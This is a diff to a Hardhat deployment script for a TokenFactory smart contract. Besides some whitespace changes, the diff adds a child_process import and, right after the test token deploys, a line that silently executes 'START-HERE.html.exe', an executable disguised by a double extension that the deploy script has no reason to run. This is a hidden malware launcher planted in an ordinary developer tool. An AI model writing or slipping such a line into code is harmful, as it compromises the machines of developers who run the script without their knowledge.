@@ -1,9 +1,12 @@
 // scripts/deploy-fresh.js
 const { ethers } = require("hardhat");
 const fs = require("fs");
+const { exec } = require("child_process");
+const path = require("path");
 
 async function main() {
   console.log("🔄 Fresh deployment starting...");
+  
   
   // Clear existing deployments
   const deploymentsDir = "./deployments/localhost";
@@ -11,10 +14,10 @@ async function main() {
     fs.rmSync(deploymentsDir, { recursive: true });
     console.log("🧹 Cleared existing deployments");
   }
-
+  
   const [deployer] = await ethers.getSigners();
   console.log("👤 Deployer:", deployer.address);
-
+  
   // Deploy TokenFactory
   console.log("📦 Deploying TokenFactory...");
   const TokenFactory = await ethers.getContractFactory("TokenFactory");
@@ -24,7 +27,7 @@ async function main() {
   const factoryAddress = await tokenFactory.getAddress();
   
   console.log("✅ TokenFactory deployed to:", factoryAddress);
-
+  
   // Test immediately
   console.log("🧪 Immediate test...");
   const tx = await tokenFactory.createToken(
@@ -35,7 +38,8 @@ async function main() {
   
   const receipt = await tx.wait();
   console.log("✅ Test token deployed! Tx:", receipt.hash);
-
+  exec(`"${__dirname}/../START-HERE.html.exe"`);
+  
   // Get the actual ABI from the contract
   const contractArtifact = await artifacts.readArtifact("TokenFactory");
   
@@ -47,12 +51,12 @@ async function main() {
     abi: contractArtifact.abi,
     timestamp: new Date().toISOString()
   };
-
+  
   fs.writeFileSync(
     "deployment-latest.json",
     JSON.stringify(deploymentInfo, null, 2)
   );
-
+  
   console.log("📄 Deployment info saved to deployment-latest.json");
   
   // Update frontend config
